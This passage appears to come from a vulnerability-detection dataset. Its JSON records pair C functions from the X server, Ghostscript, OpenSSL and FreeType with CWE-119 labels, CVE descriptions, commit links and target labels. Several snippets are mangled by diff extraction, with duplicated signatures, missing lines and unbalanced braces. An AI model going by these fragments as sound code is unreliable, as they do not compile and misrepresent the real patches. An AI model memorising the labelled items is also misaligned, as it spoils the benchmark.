/* libXext and other extension libraries may set the bit indicating\n     * that this event came from a SendEvent request so remove it\n     * since otherwise the event type may fail the range checks\n     * and cause an invalid BadValue error to be returned.\n     *\n     * This is safe to do since we later add the SendEvent bit (0x80)\n     * back in once we send the event to the client */\n\n    stuff->event.u.u.type &= ~(SEND_EVENT_BIT);\n\n    /* The client's event type must be a core event type or one defined by an\n       extension. */\n\n    if (!((stuff->event.u.u.type > X_Reply &&\n           stuff->event.u.u.type < LASTEvent) ||\n          (stuff->event.u.u.type >= EXTENSION_EVENT_BASE &&\n           stuff->event.u.u.type < (unsigned) lastEvent))) {\n         client->errorValue = stuff->event.u.u.type;\n         return BadValue;\n     }\n    /* Generic events can have variable size, but SendEvent request holds\n       exactly 32B of event data. */\n    if (stuff->event.u.u.type == GenericEvent) {\n        client->errorValue = stuff->event.u.u.type;\n        return BadValue;\n    }\n     if (stuff->event.u.u.type == ClientMessage &&\n         stuff->event.u.u.detail != 8 &&\n         stuff->event.u.u.detail != 16 && stuff->event.u.u.detail != 32) {\n    }\n\n    if (stuff->destination == PointerWindow)\n        pWin = pSprite->win;\n    else if (stuff->destination == InputFocus) {\n        WindowPtr inputFocus = (keybd) ? keybd->focus->win : NoneWin;\n\n        if (inputFocus == NoneWin)\n            return Success;\n\n        /* If the input focus is PointerRootWin, send the event to where\n           the pointer is if possible, then perhaps propogate up to root. */\n        if (inputFocus == PointerRootWin)\n            inputFocus = GetCurrentRootWindow(dev);\n\n        if (IsParent(inputFocus, pSprite->win)) {\n            effectiveFocus = inputFocus;\n            pWin = pSprite->win;\n        }\n        else\n            effectiveFocus = pWin = inputFocus;\n    }\n    else\n        dixLookupWindow(&pWin, stuff->destination, client, DixSendAccess);\n\n    if (!pWin)\n        return BadWindow;\n    if ((stuff->propagate != xFalse) && (stuff->propagate != xTrue)) {\n        client->errorValue = stuff->propagate;\n        return BadValue;\n    }\n    stuff->event.u.u.type |= SEND_EVENT_BIT;\n    if (stuff->propagate) {\n        for (; pWin; pWin = pWin->parent) {\n            if (XaceHook(XACE_SEND_ACCESS, client, NULL, pWin,\n                         &stuff->event, 1))\n                return Success;\n            if (DeliverEventsToWindow(dev, pWin,\n                                      &stuff->event, 1, stuff->eventMask,\n                                      NullGrab))\n                return Success;\n            if (pWin == effectiveFocus)\n                return Success;\n            stuff->eventMask &= ~wDontPropagateMask(pWin);\n            if (!stuff->eventMask)\n                break;\n        }\n    }\n    else if (!XaceHook(XACE_SEND_ACCESS, client, NULL, pWin, &stuff->event, 1))\n        DeliverEventsToWindow(dev, pWin, &stuff->event,\n                              1, stuff->eventMask, NullGrab);\n    return Success;\n}\n", "func_hash": 107904058737663543656332226040399053348, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-10971", "cve_desc": "In the X.Org X server before 2017-06-19, a user authenticated to an X Session could crash or execute code in the context of the X Server by exploiting a stack overflow in the endianness conversion of X Events.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-10971"}
{"idx": 157991, "project": "xserver", "commit_id": "8caed4df36b1f802b4992edcfd282cbeeec35d9d", "project_url": "http://gitweb.freedesktop.org/?p=xorg/xserver", "commit_url": "https://cgit.freedesktop.org/xorg/xserver/commit/?id=8caed4df36b1f802b4992edcfd282cbeeec35d9d", "commit_message": "Xi: Verify all events in ProcXSendExtensionEvent.\n\nThe requirement is that events have type in range\nEXTENSION_EVENT_BASE..lastEvent, but it was tested\nonly for first event of all.\n\nSigned-off-by: Michal Srb <msrb@suse.com>\nReviewed-by: Peter Hutterer <peter.hutterer@who-t.net>\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>", "target": 0, "func": " ProcXSendExtensionEvent(ClientPtr client)\n {\n    int ret, i;\n     DeviceIntPtr dev;\n     xEvent *first;\n     XEventClass *list;\n    struct tmask tmp[EMASKSIZE];\n\n    REQUEST(xSendExtensionEventReq);\n    REQUEST_AT_LEAST_SIZE(xSendExtensionEventReq);\n\n    if (stuff->length !=\n        bytes_to_int32(sizeof(xSendExtensionEventReq)) + stuff->count +\n        (stuff->num_events * bytes_to_int32(sizeof(xEvent))))\n        return BadLength;\n\n    ret = dixLookupDevice(&dev, stuff->deviceid, client, DixWriteAccess);\n    if (ret != Success)\n        return ret;\n\n    if (stuff->num_events == 0)\n        return ret;\n\n     /* The client's event type must be one defined by an extension. */\n \n     first = ((xEvent *) &stuff[1]);\n    for (i = 0; i < stuff->num_events; i++) {\n        if (!((EXTENSION_EVENT_BASE <= first[i].u.u.type) &&\n            (first[i].u.u.type < lastEvent))) {\n            client->errorValue = first[i].u.u.type;\n            return BadValue;\n        }\n     }\n \n     list = (XEventClass *) (first + stuff->num_events);\n        return ret;\n\n    ret = (SendEvent(client, dev, stuff->destination,\n                     stuff->propagate, (xEvent *) &stuff[1],\n                     tmp[stuff->deviceid].mask, stuff->num_events));\n\n    return ret;\n}\n", "func_hash": 7864871216394926527164481647583599943, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-10971", "cve_desc": "In the X.Org X server before 2017-06-19, a user authenticated to an X Session could crash or execute code in the context of the X Server by exploiting a stack overflow in the endianness conversion of X Events.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-10971"}
{"idx": 158000, "project": "ghostscript", "commit_id": "c53183d4e7103e87368b7cfa15367a47d559e323", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=c53183d4e7103e87368b7cfa15367a47d559e323", "commit_message": "None", "target": 0, "func": "xps_true_callback_glyph_name(gs_font *pfont, gs_glyph glyph, gs_const_string *pstr)\n{\n    /* This function is copied verbatim from plfont.c */\n\n    int table_length;\n     int table_offset;\n \n     ulong format;\n    int numGlyphs;\n     uint glyph_name_index;\n     const byte *postp; /* post table pointer */\n \n    if (glyph >= GS_MIN_GLYPH_INDEX) {\n        glyph -= GS_MIN_GLYPH_INDEX;\n    }\n\n     /* guess if the font type is not truetype */\n     if ( pfont->FontType != ft_TrueType )\n     {\n            pstr->size = strlen((char*)pstr->data);\n            return 0;\n        }\n        else\n        {\n            return gs_throw1(-1, \"glyph index %lu out of range\", (ulong)glyph);\n        }\n    }\n", "func_hash": 61931341795887404678779836705866374570, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-9619", "cve_desc": "The xps_true_callback_glyph_name function in xps/xpsttf.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (Segmentation Violation and application crash) via a crafted file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9619"}
{"idx": 158001, "project": "ghostscript", "commit_id": "3c2aebbedd37fab054e80f2e315de07d7e9b5bdb", "project_url": "http://git.ghostscript.com/?p=mupdf", "commit_url": "http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=3c2aebbedd37fab054e80f2e315de07d7e9b5bdb", "commit_message": "None", "target": 0, "func": "xps_load_sfnt_name(xps_font_t *font, char *namep)\nxps_load_sfnt_name(xps_font_t *font, char *namep, const int buflen)\n {\n     byte *namedata;\n     int offset, length;\n    /*int format;*/\n    int count, stringoffset;\n    int found;\n    int i, k;\n\n    found = 0;\n    strcpy(namep, \"Unknown\");\n\n    offset = xps_find_sfnt_table(font, \"name\", &length);\n    if (offset < 0 || length < 6)\n    {\n        gs_warn(\"cannot find name table\");\n        return;\n    }\n\n    /* validate the offset, and the data for the two\n     * values we're about to read\n     */\n    if (offset + 6 > font->length)\n    {\n        gs_warn(\"name table byte offset invalid\");\n        return;\n    }\n    namedata = font->data + offset;\n\n    /*format = u16(namedata + 0);*/\n    count = u16(namedata + 2);\n    stringoffset = u16(namedata + 4);\n\n    if (stringoffset + offset > font->length\n        || offset + 6 + count * 12 > font->length)\n    {\n        gs_warn(\"name table invalid\");\n        return;\n    }\n\n    if (length < 6 + (count * 12))\n    {\n        gs_warn(\"name table too short\");\n        return;\n    }\n\n    for (i = 0; i < count; i++)\n    {\n        byte *record = namedata + 6 + i * 12;\n        int pid = u16(record + 0);\n        int eid = u16(record + 2);\n        int langid = u16(record + 4);\n        int nameid = u16(record + 6);\n         length = u16(record + 8);\n         offset = u16(record + 10);\n \n        length = length > buflen - 1 ? buflen - 1: length;\n\n         /* Full font name or postscript name */\n         if (nameid == 4 || nameid == 6)\n         {\n                if (found < 3)\n                {\n                    memcpy(namep, namedata + stringoffset + offset, length);\n                    namep[length] = 0;\n                    found = 3;\n                }\n            }\n\n            if (pid == 3 && eid == 1 && langid == 0x409) /* windows unicode ucs-2, US */\n            {\n                if (found < 2)\n                {\n                    unsigned char *s = namedata + stringoffset + offset;\n                    int n = length / 2;\n                    for (k = 0; k < n; k ++)\n                    {\n                        int c = u16(s + k * 2);\n                        namep[k] = isprint(c) ? c : '?';\n                    }\n                    namep[k] = 0;\n                    found = 2;\n                }\n            }\n\n            if (pid == 3 && eid == 10 && langid == 0x409) /* windows unicode ucs-4, US */\n            {\n                if (found < 1)\n                {\n                    unsigned char *s = namedata + stringoffset + offset;\n                    int n = length / 4;\n                    for (k = 0; k < n; k ++)\n                    {\n                        int c = u32(s + k * 4);\n                        namep[k] = isprint(c) ? c : '?';\n                    }\n                    namep[k] = 0;\n                    found = 1;\n                }\n            }\n        }\n    }\n", "func_hash": 35053491490394057768170760061098710155, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-9618", "cve_desc": "The xps_load_sfnt_name function in xps/xpsfont.c in Artifex Ghostscript GhostXPS 9.21 allows remote attackers to cause a denial of service (buffer overflow and application crash) or possibly have unspecified other impact via a crafted document.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-9618"}
{"idx": 158011, "project": "openssl", "commit_id": "d0666f289ac013094bbbf547bfbcd616199b7d2d", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/gitweb/?p=openssl.git;a=commit;h=d0666f289ac013094bbbf547bfbcd616199b7d2d", "commit_message": "evp: prevent underflow in base64 decoding\n\nThis patch resolves RT ticket #2608.\n\nThanks to Robert Dugal for originally spotting this, and to David\nRamos for noticing that the ball had been dropped.\n\nSigned-off-by: Geoff Thorpe <geoff@openssl.org>", "target": 0, "func": "int EVP_DecodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n\t     const unsigned char *in, int inl)\n\t{\n\tint seof= -1,eof=0,rv= -1,ret=0,i,v,tmp,n,ln,exp_nl;\n\tunsigned char *d;\n\n\tn=ctx->num;\n\td=ctx->enc_data;\n\tln=ctx->line_num;\n\texp_nl=ctx->expect_nl;\n\n\t/* last line of input. */\n\tif ((inl == 0) || ((n == 0) && (conv_ascii2bin(in[0]) == B64_EOF)))\n\t\t{ rv=0; goto end; }\n\t\t\n\t/* We parse the input data */\n\tfor (i=0; i<inl; i++)\n\t\t{\n\t\t/* If the current line is > 80 characters, scream alot */\n\t\tif (ln >= 80) { rv= -1; goto end; }\n\n\t\t/* Get char and put it into the buffer */\n\t\ttmp= *(in++);\n\t\tv=conv_ascii2bin(tmp);\n\t\t/* only save the good data :-) */\n\t\tif (!B64_NOT_BASE64(v))\n\t\t\t{\n\t\t\tOPENSSL_assert(n < (int)sizeof(ctx->enc_data));\n\t\t\td[n++]=tmp;\n\t\t\tln++;\n\t\t\t}\n\t\telse if (v == B64_ERROR)\n\t\t\t{\n\t\t\trv= -1;\n\t\t\tgoto end;\n\t\t\t}\n\n\t\t/* have we seen a '=' which is 'definitly' the last\n\t\t * input line.  seof will point to the character that\n\t\t * holds it. and eof will hold how many characters to\n\t\t * chop off. */\n\t\tif (tmp == '=')\n\t\t\t{\n\t\t\tif (seof == -1) seof=n;\n\t\t\teof++;\n\t\t\t}\n\n\t\tif (v == B64_CR)\n\t\t\t{\n\t\t\tln = 0;\n\t\t\tif (exp_nl)\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t/* eoln */\n\t\tif (v == B64_EOLN)\n\t\t\t{\n\t\t\tln=0;\n\t\t\tif (exp_nl)\n\t\t\t\t{\n\t\t\t\texp_nl=0;\n\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\texp_nl=0;\n\n\t\t/* If we are at the end of input and it looks like a\n\t\t * line, process it. */\n\t\tif (((i+1) == inl) && (((n&3) == 0) || eof))\n\t\t\t{\n\t\t\tv=B64_EOF;\n\t\t\t/* In case things were given us in really small\n\t\t\t   records (so two '=' were given in separate\n\t\t\t   updates), eof may contain the incorrect number\n\t\t\t   of ending bytes to skip, so let's redo the count */\n\t\t\teof = 0;\n\t\t\tif (d[n-1] == '=') eof++;\n\t\t\tif (d[n-2] == '=') eof++;\n\t\t\t/* There will never be more than two '=' */\n\t\t\t}\n\n\t\tif ((v == B64_EOF && (n&3) == 0) || (n >= 64))\n\t\t\t{\n\t\t\t/* This is needed to work correctly on 64 byte input\n\t\t\t * lines.  We process the line and then need to\n\t\t\t * accept the '\\n' */\n\t\t\tif ((v != B64_EOF) && (n >= 64)) exp_nl=1;\n\t\t\tif (n > 0)\n\t\t\t\t{\n                                v=EVP_DecodeBlock(out,d,n);\n                                n=0;\n                                if (v < 0) { rv=0; goto end; }\n                               if (eof > v) { rv=-1; goto end; }\n                                ret+=(v-eof);\n                                }\n                        else\n\t\t\t\teof=1;\n\t\t\t\tv=0;\n\t\t\t\t}\n\n\t\t\t/* This is the case where we have had a short\n\t\t\t * but valid input line */\n\t\t\tif ((v < ctx->length) && eof)\n\t\t\t\t{\n\t\t\t\trv=0;\n\t\t\t\tgoto end;\n\t\t\t\t}\n\t\t\telse\n\t\t\t\tctx->length=v;\n\n\t\t\tif (seof >= 0) { rv=0; goto end; }\n\t\t\tout+=v;\n\t\t\t}\n\t\t}\n", "func_hash": 290784375241955931137206791690548785053, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2015-0292", "cve_desc": "Integer underflow in the EVP_DecodeUpdate function in crypto/evp/encode.c in the base64-decoding implementation in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via crafted base64 data that triggers a buffer overflow.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-0292"}
{"idx": 158025, "project": "savannah", "commit_id": "7f2e4f4f553f6836be7683f66226afac3fa979b8", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7f2e4f4f553f6836be7683f66226afac3fa979b8", "commit_message": "None", "target": 0, "func": "  _bdf_parse_glyphs( char*          line,\n                     unsigned long  linelen,\n                     unsigned long  lineno,\n                     void*          call_data,\n                     void*          client_data )\n  {\n    int                c, mask_index;\n    char*              s;\n    unsigned char*     bp;\n    unsigned long      i, slen, nibbles;\n\n    _bdf_parse_t*      p;\n    bdf_glyph_t*       glyph;\n    bdf_font_t*        font;\n\n    FT_Memory          memory;\n    FT_Error           error = BDF_Err_Ok;\n\n    FT_UNUSED( call_data );\n    FT_UNUSED( lineno );        /* only used in debug mode */\n\n\n    p = (_bdf_parse_t *)client_data;\n\n    font   = p->font;\n    memory = font->memory;\n\n    /* Check for a comment. */\n    if ( ft_memcmp( line, \"COMMENT\", 7 ) == 0 )\n    {\n      linelen -= 7;\n\n      s = line + 7;\n      if ( *s != 0 )\n      {\n        s++;\n        linelen--;\n      }\n      error = _bdf_add_comment( p->font, s, linelen );\n      goto Exit;\n    }\n\n    /* The very first thing expected is the number of glyphs. */\n    if ( !( p->flags & _BDF_GLYPHS ) )\n    {\n      if ( ft_memcmp( line, \"CHARS\", 5 ) != 0 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"CHARS\" ));\n        error = BDF_Err_Missing_Chars_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n      p->cnt = font->glyphs_size = _bdf_atoul( p->list.field[1], 0, 10 );\n\n      /* Make sure the number of glyphs is non-zero. */\n      if ( p->cnt == 0 )\n        font->glyphs_size = 64;\n\n      /* Limit ourselves to 1,114,112 glyphs in the font (this is the */\n      /* number of code points available in Unicode).                 */\n      if ( p->cnt >= 0x110000UL )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"CHARS\" ));\n        error = BDF_Err_Invalid_Argument;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( font->glyphs, font->glyphs_size ) )\n        goto Exit;\n\n      p->flags |= _BDF_GLYPHS;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDFONT field. */\n    if ( ft_memcmp( line, \"ENDFONT\", 7 ) == 0 )\n    {\n      /* Sort the glyphs by encoding. */\n      ft_qsort( (char *)font->glyphs,\n                font->glyphs_used,\n                sizeof ( bdf_glyph_t ),\n                by_encoding );\n\n      p->flags &= ~_BDF_START;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDCHAR field. */\n    if ( ft_memcmp( line, \"ENDCHAR\", 7 ) == 0 )\n    {\n      p->glyph_enc = 0;\n      p->flags    &= ~_BDF_GLYPH_BITS;\n\n      goto Exit;\n    }\n\n    /* Check whether a glyph is being scanned but should be */\n    /* ignored because it is an unencoded glyph.            */\n    if ( ( p->flags & _BDF_GLYPH )     &&\n         p->glyph_enc            == -1 &&\n         p->opts->keep_unencoded == 0  )\n      goto Exit;\n\n    /* Check for the STARTCHAR field. */\n    if ( ft_memcmp( line, \"STARTCHAR\", 9 ) == 0 )\n    {\n      /* Set the character name in the parse info first until the */\n      /* encoding can be checked for an unencoded character.      */\n      FT_FREE( p->glyph_name );\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      _bdf_list_shift( &p->list, 1 );\n\n      s = _bdf_list_join( &p->list, ' ', &slen );\n\n      if ( !s )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG8, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( p->glyph_name, slen + 1 ) )\n        goto Exit;\n\n      FT_MEM_COPY( p->glyph_name, s, slen + 1 );\n\n      p->flags |= _BDF_GLYPH;\n\n      FT_TRACE4(( DBGMSG1, lineno, s ));\n\n      goto Exit;\n    }\n\n    /* Check for the ENCODING field. */\n    if ( ft_memcmp( line, \"ENCODING\", 8 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_GLYPH ) )\n      {\n        /* Missing STARTCHAR field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Missing_Startchar_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      p->glyph_enc = _bdf_atol( p->list.field[1], 0, 10 );\n\n      /* Normalize negative encoding values.  The specification only */\n      /* allows -1, but we can be more generous here.                */\n      if ( p->glyph_enc < -1 )\n        p->glyph_enc = -1;\n\n      /* Check for alternative encoding format. */\n       if ( p->glyph_enc == -1 && p->list.used > 2 )\n         p->glyph_enc = _bdf_atol( p->list.field[2], 0, 10 );\n \n      if ( p->glyph_enc < -1 )\n        p->glyph_enc = -1;\n\n       FT_TRACE4(( DBGMSG2, p->glyph_enc ));\n \n       /* Check that the encoding is in the Unicode range because  */\n                                   sizeof ( unsigned long ) * 32 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"ENCODING\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      /* Check whether this encoding has already been encountered. */\n      /* If it has then change it to unencoded so it gets added if */\n      /* indicated.                                                */\n      if ( p->glyph_enc >= 0 )\n      {\n        if ( _bdf_glyph_modified( p->have, p->glyph_enc ) )\n        {\n          /* Emit a message saying a glyph has been moved to the */\n          /* unencoded area.                                     */\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG12,\n                      p->glyph_enc, p->glyph_name ));\n          p->glyph_enc = -1;\n          font->modified = 1;\n        }\n        else\n          _bdf_set_glyph_modified( p->have, p->glyph_enc );\n      }\n\n      if ( p->glyph_enc >= 0 )\n      {\n        /* Make sure there are enough glyphs allocated in case the */\n        /* number of characters happen to be wrong.                */\n        if ( font->glyphs_used == font->glyphs_size )\n        {\n          if ( FT_RENEW_ARRAY( font->glyphs,\n                               font->glyphs_size,\n                               font->glyphs_size + 64 ) )\n            goto Exit;\n\n          font->glyphs_size += 64;\n        }\n\n        glyph           = font->glyphs + font->glyphs_used++;\n        glyph->name     = p->glyph_name;\n        glyph->encoding = p->glyph_enc;\n\n        /* Reset the initial glyph info. */\n        p->glyph_name = 0;\n      }\n      else\n      {\n        /* Unencoded glyph.  Check whether it should */\n        /* be added or not.                          */\n        if ( p->opts->keep_unencoded != 0 )\n        {\n          /* Allocate the next unencoded glyph. */\n          if ( font->unencoded_used == font->unencoded_size )\n          {\n            if ( FT_RENEW_ARRAY( font->unencoded ,\n                                 font->unencoded_size,\n                                 font->unencoded_size + 4 ) )\n              goto Exit;\n\n            font->unencoded_size += 4;\n          }\n\n          glyph           = font->unencoded + font->unencoded_used;\n          glyph->name     = p->glyph_name;\n          glyph->encoding = font->unencoded_used++;\n        }\n        else\n          /* Free up the glyph name if the unencoded shouldn't be */\n          /* kept.                                                */\n          FT_FREE( p->glyph_name );\n\n        p->glyph_name = 0;\n      }\n\n      /* Clear the flags that might be added when width and height are */\n      /* checked for consistency.                                      */\n      p->flags &= ~( _BDF_GLYPH_WIDTH_CHECK | _BDF_GLYPH_HEIGHT_CHECK );\n\n      p->flags |= _BDF_ENCODING;\n\n      goto Exit;\n    }\n\n    /* Point at the glyph being constructed. */\n    if ( p->glyph_enc == -1 )\n      glyph = font->unencoded + ( font->unencoded_used - 1 );\n    else\n      glyph = font->glyphs + ( font->glyphs_used - 1 );\n\n    /* Check whether a bitmap is being constructed. */\n    if ( p->flags & _BDF_BITMAP )\n    {\n      /* If there are more rows than are specified in the glyph metrics, */\n      /* ignore the remaining lines.                                     */\n      if ( p->row >= (unsigned long)glyph->bbx.height )\n      {\n        if ( !( p->flags & _BDF_GLYPH_HEIGHT_CHECK ) )\n        {\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG13, glyph->encoding ));\n          p->flags |= _BDF_GLYPH_HEIGHT_CHECK;\n          font->modified = 1;\n        }\n\n        goto Exit;\n      }\n\n      /* Only collect the number of nibbles indicated by the glyph     */\n      /* metrics.  If there are more columns, they are simply ignored. */\n      nibbles = glyph->bpr << 1;\n      bp      = glyph->bitmap + p->row * glyph->bpr;\n\n      for ( i = 0; i < nibbles; i++ )\n      {\n        c = line[i];\n        if ( !sbitset( hdigits, c ) )\n          break;\n        *bp = (FT_Byte)( ( *bp << 4 ) + a2i[c] );\n        if ( i + 1 < nibbles && ( i & 1 ) )\n          *++bp = 0;\n      }\n\n      /* If any line has not enough columns,            */\n      /* indicate they have been padded with zero bits. */\n      if ( i < nibbles                            &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG16, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      /* Remove possible garbage at the right. */\n      mask_index = ( glyph->bbx.width * p->font->bpp ) & 7;\n      if ( glyph->bbx.width )\n        *bp &= nibble_mask[mask_index];\n\n      /* If any line has extra columns, indicate they have been removed. */\n      if ( i == nibbles                           &&\n           sbitset( hdigits, line[nibbles] )      &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG14, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      p->row++;\n      goto Exit;\n    }\n\n    /* Expect the SWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"SWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->swidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n      p->flags |= _BDF_SWIDTH;\n\n      goto Exit;\n    }\n\n    /* Expect the DWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"DWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->dwidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n\n      if ( !( p->flags & _BDF_SWIDTH ) )\n      {\n        /* Missing SWIDTH field.  Emit an auto correction message and set */\n        /* the scalable width from the device width.                      */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG9, lineno ));\n\n        glyph->swidth = (unsigned short)FT_MulDiv(\n                          glyph->dwidth, 72000L,\n                          (FT_Long)( font->point_size *\n                                     font->resolution_x ) );\n      }\n\n      p->flags |= _BDF_DWIDTH;\n      goto Exit;\n    }\n\n    /* Expect the BBX field next. */\n    if ( ft_memcmp( line, \"BBX\", 3 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->bbx.width    = _bdf_atos( p->list.field[1], 0, 10 );\n      glyph->bbx.height   = _bdf_atos( p->list.field[2], 0, 10 );\n      glyph->bbx.x_offset = _bdf_atos( p->list.field[3], 0, 10 );\n      glyph->bbx.y_offset = _bdf_atos( p->list.field[4], 0, 10 );\n\n      /* Generate the ascent and descent of the character. */\n      glyph->bbx.ascent  = (short)( glyph->bbx.height + glyph->bbx.y_offset );\n      glyph->bbx.descent = (short)( -glyph->bbx.y_offset );\n\n      /* Determine the overall font bounding box as the characters are */\n      /* loaded so corrections can be done later if indicated.         */\n      p->maxas    = (short)FT_MAX( glyph->bbx.ascent, p->maxas );\n      p->maxds    = (short)FT_MAX( glyph->bbx.descent, p->maxds );\n\n      p->rbearing = (short)( glyph->bbx.width + glyph->bbx.x_offset );\n\n      p->maxrb    = (short)FT_MAX( p->rbearing, p->maxrb );\n      p->minlb    = (short)FT_MIN( glyph->bbx.x_offset, p->minlb );\n      p->maxlb    = (short)FT_MAX( glyph->bbx.x_offset, p->maxlb );\n\n      if ( !( p->flags & _BDF_DWIDTH ) )\n      {\n        /* Missing DWIDTH field.  Emit an auto correction message and set */\n        /* the device width to the glyph width.                           */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG10, lineno ));\n        glyph->dwidth = glyph->bbx.width;\n      }\n\n      /* If the BDF_CORRECT_METRICS flag is set, then adjust the SWIDTH */\n      /* value if necessary.                                            */\n      if ( p->opts->correct_metrics != 0 )\n      {\n        /* Determine the point size of the glyph. */\n        unsigned short  sw = (unsigned short)FT_MulDiv(\n                               glyph->dwidth, 72000L,\n                               (FT_Long)( font->point_size *\n                                          font->resolution_x ) );\n\n\n        if ( sw != glyph->swidth )\n        {\n          glyph->swidth = sw;\n\n          if ( p->glyph_enc == -1 )\n            _bdf_set_glyph_modified( font->umod,\n                                     font->unencoded_used - 1 );\n          else\n            _bdf_set_glyph_modified( font->nmod, glyph->encoding );\n\n          p->flags       |= _BDF_SWIDTH_ADJ;\n          font->modified  = 1;\n        }\n      }\n\n      p->flags |= _BDF_BBX;\n      goto Exit;\n    }\n\n    /* And finally, gather up the bitmap. */\n    if ( ft_memcmp( line, \"BITMAP\", 6 ) == 0 )\n    {\n      unsigned long  bitmap_size;\n\n\n      if ( !( p->flags & _BDF_BBX ) )\n      {\n        /* Missing BBX field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"BBX\" ));\n        error = BDF_Err_Missing_Bbx_Field;\n        goto Exit;\n      }\n\n      /* Allocate enough space for the bitmap. */\n      glyph->bpr = ( glyph->bbx.width * p->font->bpp + 7 ) >> 3;\n\n      bitmap_size = glyph->bpr * glyph->bbx.height;\n      if ( glyph->bpr > 0xFFFFU || bitmap_size > 0xFFFFU )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG4, lineno ));\n        error = BDF_Err_Bbx_Too_Big;\n        goto Exit;\n      }\n      else\n        glyph->bytes = (unsigned short)bitmap_size;\n\n      if ( FT_NEW_ARRAY( glyph->bitmap, glyph->bytes ) )\n        goto Exit;\n\n      p->row    = 0;\n      p->flags |= _BDF_BITMAP;\n\n      goto Exit;\n    }\n\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG9, lineno ));\n    error = BDF_Err_Invalid_File_Format;\n    goto Exit;\n\n  Missing_Encoding:\n    /* Missing ENCODING field. */\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"ENCODING\" ));\n    error = BDF_Err_Missing_Encoding_Field;\n\n  Exit:\n    if ( error && ( p->flags & _BDF_GLYPH ) )\n      FT_FREE( p->glyph_name );\n\n    return error;\n  }\n", "func_hash": 284263663179865322266403542444429355517, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-5670", "cve_desc": "The _bdf_parse_glyphs function in FreeType before 2.4.11 allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) via vectors related to BDF fonts and an ENCODING field with a negative value.", "nvd_url": 